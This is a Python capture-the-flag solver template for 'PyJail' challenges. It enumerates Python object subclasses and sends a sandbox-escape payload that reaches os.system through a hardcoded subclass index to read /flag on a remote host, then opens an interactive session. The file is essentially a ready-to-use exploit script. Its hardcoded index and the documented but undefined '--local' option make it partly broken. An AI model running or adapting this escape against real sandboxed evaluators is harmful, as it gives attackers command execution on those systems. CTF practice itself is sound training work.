#!/usr/bin/env python3
"""
Standard CTF Misc / PyJail Solve Template
Usage:
  python3 solve_misc.py --local
  python3 solve_misc.py --remote <host> <port>
"""

import sys
import argparse
from pwn import *

def find_subclasses():
    """Locates useful RCE subclasses in current Python runtime."""
    print("[*] Inspecting loaded subclasses...")
    subclasses = ().__class__.__base__.__subclasses__()
    for i, c in enumerate(subclasses):
        s = str(c)
        if any(target in s for target in ['os._wrap_close', 'subprocess.Popen', 'FileLoader', 'catch_warnings']):
            print(f"  [{i:03d}] {s}")

def solve_pyjail(host=None, port=None):
    # Standard PyJail Payload using subclasses:
    payload = "().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['system']('cat /flag')"
    
    if host and port:
        io = remote(host, port)
        io.sendlineafter(b">>> ", payload.encode())
        io.interactive()
    else:
        print(f"[*] Generated Payload:\n{payload}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CTF Misc Solver")
    parser.add_argument("--find-classes", action="store_true", help="Find RCE subclasses")
    parser.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"), help="Remote target")
    args = parser.parse_args()

    if args.find_classes:
        find_subclasses()
    elif args.remote:
        solve_pyjail(args.remote[0], int(args.remote[1]))
    else:
        solve_pyjail()
